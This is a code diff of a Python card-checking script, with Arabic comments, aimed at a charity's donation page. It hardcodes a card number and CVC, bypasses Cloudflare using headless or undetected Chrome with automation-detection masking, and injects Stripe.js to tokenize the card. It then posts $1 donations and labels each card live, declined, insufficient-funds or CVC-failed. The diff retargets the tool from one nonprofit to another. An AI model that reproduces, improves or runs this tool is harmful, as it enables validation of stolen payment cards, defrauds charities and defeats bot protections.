@@ -2,17 +2,19 @@ import time
 import re
 import json
 import random
+import os
 import requests
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
-FLARESOLVERR_URL = 'http://localhost:8191/v1'
+# ═══════════════════════════════════════════════════════════
+# CONFIG
+# ═══════════════════════════════════════════════════════════
 
-URL = 'https://higherhopesdetroit.org/donation/'
-FORM_ID = '1057'
-FORM_HASH = 'ee0e509410'
-FORM_PREFIX = '1057-1'
+URL = 'https://goodhope.org/giving/?form-id=12124&payment-mode=stripe&level-id=custom&custom-amount=1.00'
+FORM_URL = 'https://goodhope.org/giving/'
+
 STRIPE_KEY = 'pk_live_SMtnnvlq4TpJelMdklNha8iD'
 
 CARD_NUMBER = '5104040287872188'
@@ -30,50 +32,53 @@ ZIP = '10001'
 COUNTRY = 'US'
 
 
-def step1_open_page():
+# ═══════════════════════════════════════════════════════════
+# STEP 1: Get Form Data via Requests
+# ═══════════════════════════════════════════════════════════
+
+def step1_get_form():
+    """جيب الصفحة واستخرج بيانات الفورم"""
     print("=" * 60)
-    print("STEP 1: Opening page via FlareSolverr")
+    print("STEP 1: Opening page via Requests")
     print("=" * 60)
     
-    payload = {
-        'cmd': 'request.get',
-        'url': URL,
-        'maxTimeout': 60000,
+    session = requests.Session()
+    session.verify = False
+    
+    headers = {
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'accept-language': 'en-US,en;q=0.9',
+        'accept-encoding': 'gzip, deflate, br',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
     }
     
     try:
-        print("⏳ Asking FlareSolverr...")
-        response = requests.post(FLARESOLVERR_URL, json=payload, timeout=90)
+        response = session.get(FORM_URL, headers=headers, timeout=20)
         
         print(f"📥 Status: {response.status_code}")
+        print(f"📄 Length: {len(response.text)}")
         
-        data = response.json()
+        if response.status_code != 200:
+            return None, f"HTTP_{response.status_code}"
         
-        if data.get('status') != 'ok':
-            return None, f"FLARESOLVERR_ERROR: {data.get('message', 'unknown')}"
-        
-        solution = data.get('solution', {})
-        html = solution.get('response', '')
-        cookies = solution.get('cookies', [])
-        user_agent = solution.get('userAgent', '')
-        
-        print(f"📄 HTML Length: {len(html)}")
-        print(f"🍪 Cookies: {len(cookies)}")
-        
+        html = response.text
         html_lower = html.lower()
         
-        if 'just a moment' in html_lower or 'checking your browser' in html_lower:
-            return None, "CLOUDFLARE_STILL_ACTIVE"
+        if 'just a moment' in html_lower:
+            return None, "CLOUDFLARE_CHALLENGE"
         
-        if 'give-form-id' not in html:
-            return None, "NO_GIVE_FORM"
-        
-        print("✅ Page loaded via FlareSolverr!")
-        
+        # استخرج البيانات
         form_id = None
         form_hash = None
         form_prefix = None
-        stripe_key = None
         
         m = re.search(r'name="give-form-id"\s+value="(\d+)"', html)
         if m:
@@ -87,6 +92,7 @@ def step1_open_page():
         if m:
             form_prefix = m.group(1)
         
+        stripe_key = STRIPE_KEY
         m = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', html)
         if m:
             stripe_key = m.group(0)
@@ -96,205 +102,412 @@ def step1_open_page():
         print(f"✅ Form Prefix: {form_prefix}")
         print(f"✅ Stripe Key: {stripe_key}")
         
-        session = requests.Session()
-        session.verify = False
-        
-        for cookie in cookies:
-            session.cookies.set(
-                cookie['name'],
-                cookie['value'],
-                domain=cookie.get('domain', '.higherhopesdetroit.org')
-            )
-        
-        session.headers.update({
-            'user-agent': user_agent,
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'accept-language': 'en-US,en;q=0.9',
-        })
+        if not form_id or not form_hash:
+            return None, "MISSING_FORM_DATA"
         
         return {
             'session': session,
-            'html': html,
-            'form_id': form_id or FORM_ID,
-            'form_hash': form_hash or FORM_HASH,
-            'form_prefix': form_prefix or FORM_PREFIX,
-            'stripe_key': stripe_key or STRIPE_KEY,
+            'form_id': form_id,
+            'form_hash': form_hash,
+            'form_prefix': form_prefix or f'{form_id}-1',
+            'stripe_key': stripe_key,
+            'cookies': dict(session.cookies),
         }, "OK"
     
     except Exception as e:
         return None, f"ERROR: {str(e)[:150]}"
 
 
-def step2_create_stripe_pm(data):
+# ═══════════════════════════════════════════════════════════
+# STEP 2: Generate Stripe PM via Selenium
+# ═══════════════════════════════════════════════════════════
+
+def step2_generate_pm(form_data):
+    """Selenium يولّد Stripe PM"""
     print("\n" + "=" * 60)
-    print("STEP 2: Creating Stripe PM")
+    print("STEP 2: Generating Stripe PM via Selenium")
     print("=" * 60)
-    
-    stripe_url = 'https://api.stripe.com/v1/payment_methods'
-    
-    payload = {
-        'type': 'card',
-        'card[number]': CARD_NUMBER,
-        'card[exp_month]': EXP_MONTH,
-        'card[exp_year]': EXP_YEAR,
-        'card[cvc]': CVC,
-        'billing_details[name]': f'{FIRST_NAME} {LAST_NAME}',
-        'billing_details[email]': EMAIL,
-        'billing_details[address][line1]': ADDRESS,
-        'billing_details[address][city]': CITY,
-        'billing_details[address][state]': STATE,
-        'billing_details[address][postal_code]': ZIP,
-        'billing_details[address][country]': COUNTRY,
-        'key': data['stripe_key'],
-    }
-    
-    headers = {
-        'accept': 'application/json',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://js.stripe.com',
-        'referer': 'https://js.stripe.com/',
-    }
     
     try:
-        response = data['session'].post(stripe_url, data=payload, headers=headers, timeout=30)
+        import undetected_chromedriver as uc
+    except ImportError:
+        # Fallback لـ Selenium عادي
+        try:
+            from selenium import webdriver
+            from selenium.webdriver.chrome.options import Options
+            from selenium.webdriver.chrome.service import Service
+            
+            print("⚠️ Using regular Selenium (no undetected)")
+            
+            options = Options()
+            options.binary_location = '/usr/bin/chromium'
+            options.add_argument('--no-sandbox')
+            options.add_argument('--disable-dev-shm-usage')
+            options.add_argument('--disable-gpu')
+            options.add_argument('--headless=new')
+            options.add_argument('--window-size=1920,1080')
+            options.add_argument('--disable-blink-features=AutomationControlled')
+            options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36')
+            options.add_experimental_option("excludeSwitches", ["enable-automation"])
+            options.add_experimental_option('useAutomationExtension', False)
+            
+            if os.path.exists('/usr/bin/chromedriver'):
+                service = Service('/usr/bin/chromedriver')
+                driver = webdriver.Chrome(service=service, options=options)
+            else:
+                driver = webdriver.Chrome(options=options)
+            
+            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
         
-        print(f"📥 Stripe Status: {response.status_code}")
-        print(f"📥 Response: {response.text[:400]}")
+        except Exception as e:
+            return None, f"Driver error: {str(e)[:150]}"
+    else:
+        # undetected-chromedriver
+        print("✅ Using undetected-chromedriver")
         
-        if response.status_code == 200:
-            result = response.json()
-            if 'id' in result:
-                return result['id'], "OK"
+        options = uc.ChromeOptions()
+        options.binary_location = '/usr/bin/chromium'
+        options.add_argument('--no-sandbox')
+        options.add_argument('--disable-dev-shm-usage')
+        options.add_argument('--disable-gpu')
+        options.add_argument('--headless=new')
+        options.add_argument('--window-size=1920,1080')
+        options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36')
         
         try:
-            err = response.json()
-            if 'error' in err:
-                code = err['error'].get('code', '')
-                decline = err['error'].get('decline_code', '')
-                message = err['error'].get('message', '')[:100]
+            driver = uc.Chrome(
+                options=options,
+                driver_executable_path='/usr/bin/chromedriver',
+                use_subprocess=True
+            )
+        except:
+            driver = uc.Chrome(options=options, use_subprocess=True)
+    
+    # ═══ Open Page ═══
+    try:
+        print(f"🌐 Opening: {URL}")
+        driver.get(URL)
+        
+        # استنى الصفحة + Stripe.js
+        max_wait = 30
+        start = time.time()
+        
+        while time.time() - start < max_wait:
+            html = driver.page_source
+            if 'just a moment' in html.lower():
+                print(f"   ⏳ Cloudflare...")
+                time.sleep(2)
+                continue
+            if 'stripe' in html.lower() or 'Stripe' in html:
+                break
+            time.sleep(1)
+        
+        print(f"📄 Page loaded, length: {len(driver.page_source)}")
+        
+        # ═══ Generate Stripe PM via JS ═══
+        print("💳 Injecting Stripe.js...")
+        
+        stripe_js = """
+        var callback = arguments[arguments.length - 1];
+        var stripeKey = arguments[0];
+        var cardNum = arguments[1];
+        var expM = arguments[2];
+        var expY = arguments[3];
+        var cvc = arguments[4];
+        var name = arguments[5];
+        var email = arguments[6];
+        
+        (async () => {
+            try {
+                if (typeof Stripe === 'undefined') {
+                    await new Promise((resolve, reject) => {
+                        const s = document.createElement('script');
+                        s.src = 'https://js.stripe.com/v3/';
+                        s.onload = resolve;
+                        s.onerror = () => reject(new Error('Stripe.js load failed'));
+                        document.head.appendChild(s);
+                    });
+                    await new Promise(r => setTimeout(r, 2000));
+                }
+                
+                if (typeof Stripe === 'undefined') {
+                    callback(JSON.stringify({error: 'Stripe.js not available'}));
+                    return;
+                }
+                
+                const stripe = Stripe(stripeKey);
+                
+                const result = await stripe.createPaymentMethod({
+                    type: 'card',
+                    card: {
+                        number: cardNum,
+                        exp_month: parseInt(expM),
+                        exp_year: parseInt(expY),
+                        cvc: cvc
+                    },
+                    billing_details: {
+                        name: name,
+                        email: email,
+                        address: {
+                            line1: '123 Main Street',
+                            city: 'New York',
+                            state: 'NY',
+                            postal_code: '10001',
+                            country: 'US'
+                        }
+                    }
+                });
+                
+                if (result.error) {
+                    callback(JSON.stringify({
+                        error: result.error.message,
+                        code: result.error.code,
+                        decline_code: result.error.decline_code
+                    }));
+                } else {
+                    callback(JSON.stringify({
+                        pm_id: result.paymentMethod.id,
+                        success: true
+                    }));
+                }
+            } catch (e) {
+                callback(JSON.stringify({error: 'Exception: ' + e.message}));
+            }
+        })();
+        """
+        
+        try:
+            driver.set_script_timeout(30)
+            result_raw = driver.execute_async_script(
+                stripe_js,
+                form_data['stripe_key'],
+                CARD_NUMBER,
+                EXP_MONTH,
+                EXP_YEAR,
+                CVC,
+                f'{FIRST_NAME} {LAST_NAME}',
+                EMAIL
+            )
+            
+            print(f"📥 Stripe JS response: {result_raw[:400]}")
+            
+            pm_data = json.loads(result_raw)
+            
+            if 'error' in pm_data:
+                error = pm_data['error']
+                decline = pm_data.get('decline_code', '')
+                code = pm_data.get('code', '')
+                
+                driver.quit()
                 
                 if decline:
-                    return None, f"STRIPE_{decline.upper()}: {message}"
+                    return None, f"STRIPE_{decline.upper()}: {error[:100]}"
                 if code:
-                    return None, f"STRIPE_{code.upper()}: {message}"
-                return None, f"STRIPE_ERROR: {message}"
-        except:
-            pass
+                    return None, f"STRIPE_{code.upper()}: {error[:100]}"
+                return None, f"STRIPE_ERROR: {error[:100]}"
+            
+            pm_id = pm_data.get('pm_id')
+            print(f"✅ PM ID: {pm_id}")
+            
+            # ═══ Get Cookies ═══
+            cookies = driver.get_cookies()
+            cookie_dict = {c['name']: c['value'] for c in cookies}
+            print(f"✅ Got {len(cookies)} cookies")
+            
+            ua = driver.execute_script("return navigator.userAgent")
+            
+            driver.quit()
+            
+            return {
+                'pm_id': pm_id,
+                'cookies': cookie_dict,
+                'user_agent': ua,
+            }, "OK"
         
-        return None, f"STRIPE_{response.status_code}"
+        except Exception as e:
+            driver.quit()
+            return None, f"Stripe JS error: {str(e)[:150]}"
     
     except Exception as e:
-        return None, f"ERROR: {str(e)[:100]}"
+        try:
+            driver.quit()
+        except:
+            pass
+        return None, f"Selenium error: {str(e)[:150]}"
 
 
-def step3_submit_donation(data, pm_id):
+# ═══════════════════════════════════════════════════════════
+# STEP 3: Submit Donation
+# ═══════════════════════════════════════════════════════════
+
+def step3_submit(form_data, pm_data):
+    """أرسل POST للتبرع"""
     print("\n" + "=" * 60)
-    print("STEP 3: Submitting donation")
+    print("STEP 3: Submitting Donation")
     print("=" * 60)
     
-    donation_url = f'https://higherhopesdetroit.org/donation/?payment-mode=stripe&form-id={data["form_id"]}'
+    # استخدم جلسة جديدة مع cookies من Selenium
+    session = requests.Session()
+    session.verify = False
+    
+    # دمج cookies
+    for k, v in form_data.get('cookies', {}).items():
+        session.cookies.set(k, v)
+    
+    for k, v in pm_data.get('cookies', {}).items():
+        session.cookies.set(k, v)
+    
+    print(f"🍪 Total cookies: {len(session.cookies)}")
+    
+    # Construct POST URL
+    post_url = f'https://goodhope.org/giving/?payment-mode=stripe&form-id={form_data["form_id"]}'
     
     payload = {
         'give-honeypot': '',
-        'give-form-id-prefix': data['form_prefix'],
-        'give-form-id': data['form_id'],
-        'give-form-title': 'Give a Donation',
-        'give-current-url': URL,
-        'give-form-url': URL,
+        'give-form-id-prefix': form_data['form_prefix'],
+        'give-form-id': form_data['form_id'],
+        'give-form-title': 'Give via ApplePay/Google Pay',
+        'give-current-url': FORM_URL,
+        'give-form-url': FORM_URL,
         'give-form-minimum': '1.00',
         'give-form-maximum': '999999.99',
-        'give-form-hash': data['form_hash'],
+        'give-form-hash': form_data['form_hash'],
         'give-price-id': 'custom',
         'give-amount': '1.00',
-        'give_tributes_type': 'In Honor Of',
-        'give_tributes_show_dedication': 'no',
-        'give_tributes_radio_type': 'In Honor Of',
-        'give_tributes_first_name': '',
-        'give_tributes_last_name': '',
-        'give_stripe_payment_method': pm_id,
+        'give_stripe_payment_method': pm_data['pm_id'],
         'payment-mode': 'stripe',
         'give_first': FIRST_NAME,
         'give_last': LAST_NAME,
         'give_email': EMAIL,
-        'give_comment': 'Donation',
         'card_name': f'{FIRST_NAME} {LAST_NAME}',
-        'billing_country': COUNTRY,
-        'card_address': ADDRESS,
-        'card_address_2': '',
-        'card_city': CITY,
-        'card_state': STATE,
-        'card_zip': ZIP,
         'give_action': 'purchase',
         'give-gateway': 'stripe',
     }
     
     headers = {
-        'authority': 'higherhopesdetroit.org',
+        'authority': 'goodhope.org',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
         'accept-language': 'en-US,en;q=0.9',
         'cache-control': 'max-age=0',
         'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://higherhopesdetroit.org',
-        'referer': URL,
+        'origin': 'https://goodhope.org',
+        'referer': FORM_URL,
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': pm_data.get('user_agent', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'),
     }
     
     try:
-        response = data['session'].post(donation_url, data=payload, headers=headers, timeout=30)
+        response = session.post(post_url, data=payload, headers=headers, timeout=30)
         
         print(f"📥 Status: {response.status_code}")
         print(f"📄 Length: {len(response.text)}")
+        print(f"📄 First 500: {response.text[:500]}")
         
         return parse_response(response.text, response.status_code)
     
     except Exception as e:
-        return f"ERROR: {str(e)[:100]}"
+        return f"POST error: {str(e)[:150]}"
 
+
+# ═══════════════════════════════════════════════════════════
+# Parse Response
+# ═══════════════════════════════════════════════════════════
 
 def parse_response(text, status_code):
+    """تحليل الرد"""
     text_lower = text.lower()
     
+    # Live responses
     live_map = {
         'insufficient_funds': 'INSUFFICIENT_FUNDS',
+        'insufficient funds': 'INSUFFICIENT_FUNDS',
         'your card has insufficient funds': 'INSUFFICIENT_FUNDS',
         'card was declined': 'DECLINED',
         'your card was declined': 'DECLINED',
         'expired_card': 'EXPIRED_CARD',
+        'your card has expired': 'EXPIRED_CARD',
         'suspected fraud': 'SUSPECTED_FRAUD',
+        'fraudulent': 'SUSPECTED_FRAUD',
         'incorrect_cvc': 'CVV_FAILURE',
+        'security code is incorrect': 'CVV_FAILURE',
+        'incorrect_number': 'INVALID_CARD_NUMBER',
+        'card number is incorrect': 'INVALID_CARD_NUMBER',
         'do_not_honor': 'DO_NOT_HONOR',
+        'processing_error': 'PROCESSING_ERROR',
         'thank you': 'CHARGE 1.0',
         'success': 'CHARGE 1.0',
+        'completed': 'CHARGE 1.0',
     }
     
     for kw, resp in live_map.items():
         if kw in text_lower:
             return resp
     
+    # JSON
+    if text.strip().startswith('{'):
+        try:
+            data = json.loads(text)
+            if isinstance(data, dict):
+                if data.get('success'):
+                    return 'CHARGE 1.0'
+                if 'data' in data and isinstance(data['data'], dict):
+                    inner = data['data']
+                    if 'error' in inner:
+                        return f"GATEWAY: {inner['error'][:100]}"
+        except:
+            pass
+    
+    # Search error in HTML
+    matches = re.findall(r'"error[^"]*"\s*:\s*"([^"]+)"', text)
+    if matches:
+        return f"ERROR: {matches[0][:100]}"
+    
+    match = re.search(r'(error[:\s]+[^<\n]{5,150})', text_lower)
+    if match:
+        return f"ERROR: {match.group(1)[:100]}"
+    
     if status_code == 200:
-        return f"UNKNOWN: {text[:200].strip()}"
+        return f"UNKNOWN_200: {text[:200].strip()}"
     return f"HTTP_{status_code}"
 
 
+# ═══════════════════════════════════════════════════════════
+# MAIN
+# ═══════════════════════════════════════════════════════════
+
 def run():
     print("🚀 STARTING")
+    print(f"🎯 Target: {URL}")
+    print(f"💳 Card: {CARD_NUMBER[:4]}...{CARD_NUMBER[-4:]}")
+    print("")
     
-    data, result = step1_open_page()
+    # Step 1
+    form_data, result = step1_get_form()
     if result != "OK":
-        print(f"\n❌ Failed at Step 1: {result}")
+        print(f"\n❌ Failed Step 1: {result}")
         return result
     
-    pm_id, result = step2_create_stripe_pm(data)
+    # Step 2
+    pm_data, result = step2_generate_pm(form_data)
     if result != "OK":
-        print(f"\n❌ Failed at Step 2: {result}")
+        print(f"\n❌ Failed Step 2: {result}")
         return result
     
-    final = step3_submit_donation(data, pm_id)
+    # Step 3
+    final_result = step3_submit(form_data, pm_data)
     
     print("\n" + "=" * 60)
-    print(f"📊 FINAL: {final}")
+    print(f"📊 FINAL RESULT: {final_result}")
     print("=" * 60)
     
-    return final
+    return final_result
 
 
 if __name__ == '__main__':
